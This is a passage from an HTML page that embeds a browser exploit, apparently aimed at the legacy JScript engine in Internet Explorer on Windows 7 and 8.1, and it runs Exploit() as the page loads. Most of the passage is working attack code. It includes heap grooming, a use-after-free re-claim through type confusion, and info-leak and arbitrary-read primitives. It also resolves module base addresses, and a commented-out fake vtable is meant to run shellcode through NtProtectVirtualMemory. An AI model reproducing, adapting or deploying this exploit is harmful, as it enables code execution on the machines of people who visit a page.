    FakeVtable += ConvertDwordArrayToBytes([0x40]); // +RX (PAGE_EXECUTE_READ) causes problems due to the page alignment used by NtProtectVirtualMemory. The shellcode is unlikely to begin on a clean multiple of 0x1000, and similarly won't probably end on one either (although this attribute can be manipulated with padding). +RW data on the heap surrounding the shellcode may end up +RX and this causes crashes.
    FakeVtable += ConvertDwordArrayToBytes([WritableAddress + 0xC]);
    FakeVtable += ConvertDwordArrayToBytes([ShellcodeAddress]);
    FakeVtable += ConvertDwordArrayToBytes([0x11111111]); // Shellcode will return to this pseudo-address
    
    // Padding on the end of the vtable is not needed: both NtProtectVirtualMemory and the shellcode will be using memory below this address
    
    return FakeVtable;
}
*/
////////
////////
// Misc. helper functions
////////

function NullSanitizeWord(StrWord) {
    var Sanitized = 0;
    
    if(StrWord != 0) {
        if((StrWord & 0x00FF) == 0) {
            Sanitized = 0; // First byte is NULL, end of the string.
        }
        else {
            Sanitized = StrWord;
        }
    }
    
    return Sanitized;
}

function BinaryCmp(TargetNum, CmpNum) { // return -1 for TargetNum being greater, 0 for equal, 1 for CmpNum being greater
    if(TargetNum == CmpNum) {
        return 0;
    }
    
    while(true) {
        if((TargetNum & 0xff) > (CmpNum & 0xff)) {
            return -1;
        }
        else if((TargetNum & 0xff) < (CmpNum & 0xff)) {
            return 1;
        }
        
        TargetNum = TargetNum >> 8;
        CmpNum = CmpNum >> 8;
    }
}

function DwordToUnicode(Dword) {
    var Unicode = String.fromCharCode(Dword & 0xFFFF);
    Unicode += String.fromCharCode(Dword >> 16);
    return Unicode;
}

function TableToUnicode(Table) {
    var Unicode = "";
    
    for (i = 0; i < Table.length; i++) {
        Unicode += DwordToUnicode(Table[i]);
    }

    return Unicode;
}

function ConvertDwordArrayToBytes(DwordArray) {
    var ByteArray = [];
    
    for (i = 0; i < DwordArray.length; i++) {
        ByteArray.push(DwordArray[i] & 0xffff);
        ByteArray.push((DwordArray[i] & 0xffff0000) >> 16);
    }
    
    return String.fromCharCode.apply(null, ByteArray);
}

function StrcmpLeak(StrDwordTable, LeakAddress) { // Compare two strings between an array of WORDs and a string at a memory address
    var TargetTableIndex = 0;
    
    while (TargetTableIndex < StrDwordTable.length) {
        var LeakStrWord = LeakWord(from_int52(to_int52(LeakAddress.hi, LeakAddress.lo + (4 * TargetTableIndex))));
        var SanitizedStrWord = NullSanitizeWord(LeakStrWord);
        var TableWord = (StrDwordTable[TargetTableIndex] & 0x0000FFFF);
        
        //DebugLog("StrcmpLeak comparing 0x" + TableWord.toString(16) + " to 0x" + SanitizedStrWord.toString(16) + " original word " + LeakStrWord.toString(16));
        
        if(TableWord == SanitizedStrWord) {
			//DebugLog("Words maatched. Leaking second word");
            LeakStrWord = LeakWord(from_int52(to_int52(LeakAddress.hi, LeakAddress.lo + (4 * TargetTableIndex) + 2)));
            SanitizedStrWord = NullSanitizeWord(LeakStrWord);
            TableWord = ((StrDwordTable[TargetTableIndex] & 0xFFFF0000) >> 16);
            //DebugLog("StrcmpLeak comparing 0x" + TableWord.toString(16) + " to 0x" + SanitizedStrWord.toString(16));
            
            if(TableWord == SanitizedStrWord) {
                if((TargetTableIndex + 1) >= StrDwordTable.length) {
                    return true;
                }
                else {
                    //DebugLog("Chunks are equal but not at final index, current is: " + TargetTableIndex.toString(10) + " DWORD array length is: " + StrDwordTable.length.toString(10));
                }
                
                TargetTableIndex++;
            }
            else {
                break;
            }
        }
        else {
            break;
        }
    }
    
    return false;
}

////////
////////
// Primary high level exploit logic
////////

function to_int52(hi, lo) {
    /* range checking */
    if ((lo !== lo|0) && (lo !== (lo|0)+4294967296))
        DebugLog ("lo out of range: "+lo.toString(16));
    if (hi !== hi|0 && hi >= 1048576)
        DebugLog ("hi out of range: "+hi.toString(16));

    if (lo < 0)
    lo += 4294967296;

    return hi * 4294967296 + lo;
}

function from_int52(i) {
    var lo = i | 0;
    if (lo < 0)
    lo += 4294967296;

    var hi = i - lo;
    hi /= 4294967296;
    if ((hi < 0) || (hi >= 1048576))
        DebugLog("not an int52: "+i.toString(16));
    return { lo: lo, hi: hi };
}


function Exploit() {
    // Initialization
    
	if(WindowsVersion <= 7) {
		ReClaimNameList = ReClaimIndexNameList;
		NameListAnchorCount = 20000;
	}
	else {
		ReClaimNameList = ReClaimBackupNameLists;
		NameListAnchorCount = 20000; // The larger this number the more reliable the exploit on Windows 8.1 where LFH cannot easily re-claim
	}
	
    StartTimer();
    for(i = 0; i < 310; i++) SortArray[i] = [0, 0]; // An array of arrays to be sorted by glitched sort method
    
	var LFHBlocks = new Array();

    // Trigger LFH for a size of 0x648

    for(i = 0; i < 50; i++) {
        Temp = new Object();
        Temp[Array(570).join('A')] = 1; // Property name size of 0x17a (378) will produce an allocation of 0x648 bytes
        LFHBlocks.push(Temp);
    }
    
    EndTimer("LFH");
    
    // New set of untracked vars in freed GcBlock
    
    StartTimer();
    NewUntrackedVarSet(); // Consistently 460 total
    DebugLog("Total untracked variables: " + UntrackedVarSet.length.toString(10));
    
    // Re-claim with type confusion NameLists
    
    for(i = 0; i < NameListAnchorCount; i++) {
        NameListAnchors[i][SizerPropName] = 1; // 0x17a property name size for 0x648 NameList allocation size
        NameListAnchors[i]["BBBBBBBBBBB"] = 1; // 11*2 = 22 in 64-bit, 9*2 = 18 bytes in 32-bit
        NameListAnchors[i]["\u0005"] = 1; // This ends up in the VVAL hash/name length to be type confused with an integer VAR
        NameListAnchors[i]["C"] = i; // The address of this VVAL will be leaked
    }
    
    EndTimer("Infoleak VAR creation + re-claim");
    
    // Leak final VVAL address from one of the NameLists
    
	StartTimer();
    AnchorObjectsBackup = NameListAnchors; // Prevent it from being freed and losing our leaked pointer
    EndTimer("Anchor backup");
    StartTimer();
    
    var LeakedVvalAddress = undefined;
	
    for(i = 0; i < UntrackedVarSet.length; i++) {
        if(typeof UntrackedVarSet[i] === "number" && UntrackedVarSet[i] % 1 != 0) {
			LeakedVvalAddress = (UntrackedVarSet[i] / 4.9406564584124654E-324); // This division just converts the float into an easy-to-read 32-bit number
            break;
        }
    }
	
	LeakedVvalAddress = from_int52(LeakedVvalAddress); // In Windows 7, the leaked heap pointer could always be encoded in 32-bits. On Windows 8.1 IE11, it often consumes more. By leaking the final VVAL pointer with a double float we can get the bits we need. Experimenting with this I learned all JS numbers are 52 bits in size.
	
	//LowTest=Split52.lo;
	//HighTest=Split52.hi;
	//LowTest &= 0x00000000FFFFFFFF; // Big endian;
	//HighTest &= 0xFFFFFFFF00000000;
	//HighTest = ((HighTest & 0xFFFFFFFFFFFFFFFF) >> 32);
	//HighTest = (HighTest >> 16);
	
    EndTimer("Infoleak VAR scan");
    DebugLog("leaked final VVAL address of 0x" + LeakedVvalAddress.toString(16) + " low: 0x" + LeakedVvalAddress.lo.toString(16) + " high: 0x" + LeakedVvalAddress.hi.toString(16) + " combined: 0x" + LeakedVvalAddress.hi.toString(16) + LeakedVvalAddress.lo.toString(16));
	
    
    if(LeakedVvalAddress != 0) {
        var PrimaryVvalPropName = "AAAAAAAA"; // 16 bytes for size of GcBlock double linked list pointers

        for(i=0; i < 46; i++) {
            PrimaryVvalPropName += CreateVar64(0x80, LeakedVvalAddress.lo, LeakedVvalAddress.hi, 0, 0); // Type 0x80 is a VAR reference
        }
        
		//PrimaryVvalPropName += "AAAAAAAAA";
		//PrimaryVvalPropName = PrimaryVvalPropName.substr(0, PrimaryVvalPropName.length);
		while(PrimaryVvalPropName.length < 0x239) PrimaryVvalPropName += "A";
		//DebugLog("Primary VVAL property name length: 0x" + PrimaryVvalPropName.length.toString(16));
        //while(PrimaryVvalPropName.length < 0x17a) PrimaryVvalPropName += "A"; // Dynamically pad the end of the proeprty name to a length of 0x17a

        // New set of untracked vars in freed GcBlock
        
        StartTimer();
        NewUntrackedVarSet();
        
        // Re-claim with leaked VVAL address vars (to be dereferenced for anchor object index extraction)
        
        for(i = 0; i < NameListAnchorCount; i++) {
            NameListAnchors[i][PrimaryVvalPropName] = 1;
			//NameListAnchors[i]["BBBBBBBBBBB"] = 1; // 11*2 = 22 in 64-bit, 9*2 = 18 bytes in 32-bit
			//NameListAnchors[i]["\u0005"] = 1; // This ends up in the VVAL hash/name length to be type confused with an integer VAR
			//NameListAnchors[i]["C"] = i; // The address of this VVAL will be leaked
        }
        
        EndTimer("Anchor index VAR creation + re-claim");
        StartTimer();
        
        // Extract NameList anchor index through untracked var dereference to leaked VVAL prefix VAR
        
        var LeakedVvalVar;

        for(i = 0; i < UntrackedVarSet.length; i++) {
            if(typeof UntrackedVarSet[i] === "number") {
                LeakedAnchorIndex = parseInt(UntrackedVarSet[i] + ""); // Attempting to access the untracked var without parseInt will fail ("null or not an object")
                LeakedVvalVar = UntrackedVarSet[i]; // The + "" trick alone does not seeem to be enough to populate this with the actual value
                break;
            }
        }
        
        DebugLog("Leaked anchor object index: " + LeakedAnchorIndex.toString(16));
        
        // Verify that the VAR within the leaked VVAL can be influenced by directly freeing/re-claiming the NameList associated with the leaked NameList anchor object (whose index is now known)
        
        ReClaimNameList(0x11, "A");
        
        if(LeakedVvalVar + "" == 0x11) {
            // Create the mutable variable which will be used throughout the remainder of the exploit
            
            EndTimer("Anchor index VAR scan");
            DebugLog("Leaked anchor object re-claim verification success");
        
            ReClaimNameList(0, CreateVar64(0x3, 0x22, 0, 0, 0));
            
            var PrimaryVvalPropName = "AAAAAAAA"; // 2 wide chars (4 bytes) plus the 4 byte BSTR length gives 8 bytes: the size of the two GcBlock linked list pointers. Everything after this point can be fake VARs and a tail padding.

            for(i=0; i < 46; i++) {
                PrimaryVvalPropName += CreateVar64(0x80, LeakedVvalAddress.lo + 0x40, LeakedVvalAddress.hi, 0, 0); // +0x40 is the offset to property name field of 64-bit VVAL struct. Type 0x80 is a VAR reference
            }
            
            while(PrimaryVvalPropName.length < 0x239) PrimaryVvalPropName += "A"; // Dynamically pad the end of the proeprty name to correct length
            
            // New set of untracked vars in freed GcBlock
            
            StartTimer();
            NewUntrackedVarSet();
            
            // Re-claim with leaked VVAL name property address vars (this is the memory address of the mutable variable that will be created)
            
            for(i = 0; i < NameListAnchorCount; i++) {
                NameListAnchors[i][PrimaryVvalPropName] = 1;
            }
            
            EndTimer("Mutable VAR reference creation + re-claim");
            StartTimer();
            
            for(i = 0; i < UntrackedVarSet.length; i++) {
                if(typeof UntrackedVarSet[i] === "number") {
                    if(UntrackedVarSet[i] + "" == 0x22) {
                        MutableVar = UntrackedVarSet[i];
                        break;
                    }
                }
            }
            
            // Verify the mutable var can be changed via simple re-claim
            
            ReClaimNameList(0, CreateVar64(0x3, 0x33, 0, 0, 0));
            
            if(MutableVar + "" == 0x33) {
                // Test arbitrary read primitive
                
                EndTimer("Mutable VAR reference scan");
                DebugLog("Verified mutable variable modification via re-claim");
                var MutableVarAddress = from_int52(to_int52(LeakedVvalAddress.hi, LeakedVvalAddress.lo + 0x40));
				var FirstByte = LeakByte(MutableVarAddress);
				//alert("Read byte 0x" + FirstByte.toString(16) + " from 0x" + MutableVarAddress.hi.toString(16) + MutableVarAddress.lo.toString(16));
                if(LeakByte(MutableVarAddress) == 0x8) { // Change mutable var to a BSTR pointing at itself.
                    // Derive jscript.dll base from leaked Object vtable
                
                    DebugLog("Memory leak test successful");
                    StartTimer();
                    
                    var DissectedObj = new Object();
                    var ObjectAddress = LeakObjectAddress(LeakedVvalAddress, DissectedObj);
                    var VtableAddress = LeakQword(ObjectAddress);
                    
                    DebugLog("Leaked vtable address: 0x" + VtableAddress.hi.toString(16) + VtableAddress.lo.toString(16));
                    
                    var JScriptBase = DiveModuleBase(VtableAddress);
                    
                    if(JScriptBase != 0) {
                        // Extract the first Kernel32.dll import from Jscript.dll IAT to dive for its base
                        
                        EndTimer("JScriptBase base leak");
                        DebugLog("Leaked JScript base address: 0x" + JScriptBase.hi.toString(16) + JScriptBase.lo.toString(16));
                        
                        StartTimer();
                        var Kernel32ImportX = ExtractBaseFromImports(JScriptBase, [0x4e52454b, 0x32334c45]); // 0x4e52454b, 0x32334c45
                        
                        if(Kernel32ImportX != 0) {
                            EndTimer("Kernel32 random import leak");
                            StartTimer();
                            
                            var Kernel32Base = DiveModuleBase(Kernel32ImportX);
                            
                            if(Kernel32Base != 0) {
                                EndTimer("Kernel32.dll base resolution");
                                DebugLog("Successfully resolved kernel32.dll base at 0x" + Kernel32Base.hi.toString(16) + Kernel32Base.lo.toString(16));
                                    
								StartTimer();
								var MsvcrtImportX = ExtractBaseFromImports(JScriptBase, [0x6376736d, 0x642e7472]);
								var MsvcrtBase = DiveModuleBase(MsvcrtImportX);
								EndTimer("MsvcrtBase base leak");
								
								DebugLog("Msvcrt base: 0x" + MsvcrtBase.hi.toString(16) + MsvcrtBase.lo.toString(16));
								
								var NtdllImportX = ExtractBaseFromImports(MsvcrtBase, [0x6c64746e, 0x6c642e6c]);
								var NtdllBase = DiveModuleBase(NtdllImportX);
								DebugLog("Ntdll base: 0x" + NtdllBase.hi.toString(16) + NtdllBase.lo.toString(16));
								//ReClaimNameList(0, CreateVar64(0x81, LeakedVvalAddress + 0x30 + 16 + 8, 0) + CreateVar64(0, FakeVtableAddress, 0)); // VAR in VVAL will be a type 0x81 (not type 0x80) VAR. The 0x81 VAR pointer goes to the allocated (Array) object, the first 4 bytes of which are a vtable within jscript.dll. In short, 0x80 references a VAR while 0x81 references an actual object.
								typeof MutableVar;
								DebugLog("Clean return from shellcode");
                            }
                            else {
                                DebugLog("Failed to identify Kernel32.dll base address via import " + Kernel32ImportX.toString(16));
                            }
                        }
                        else {
                            DebugLog("Failed to identify raandom kernel32.dll import address from JScript.dll IAT");
                        }
                    }
                    else {
                        DebugLog("Failed to leak JScript.dll base address");
                    }
                }
                else {
                    DebugLog("Memory leak test failed");
                }
            }
            else {
                DebugLog("Failed to verify mutable variable modification via re-claim");
            }
        }
        else {
            DebugLog("Failed to extract final VVAL index via re-claim");
        }
    }
    else {
        DebugLog("Leaked anchor object type confusion re-claim failed");
    }
}

Exploit();

</script>
</head>
</html>